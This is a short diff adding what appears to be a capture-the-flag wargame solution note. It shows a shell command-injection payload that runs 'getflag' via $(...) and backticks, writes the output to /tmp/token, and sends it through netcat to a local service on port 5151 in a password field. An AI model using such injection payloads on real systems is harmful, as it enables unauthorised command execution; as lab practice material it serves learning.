@@ -1,0 +1,8 @@
+exploit after echo since it's shell
+you can use the program to do the getflag
+
+$(echo $(getflag) >/tmp/token)
+touch /tmp/token
+chmod 777 /tmp/token
+echo $'`echo $(getflag)>/tmp/token`'|nc localhost 5151
+as password
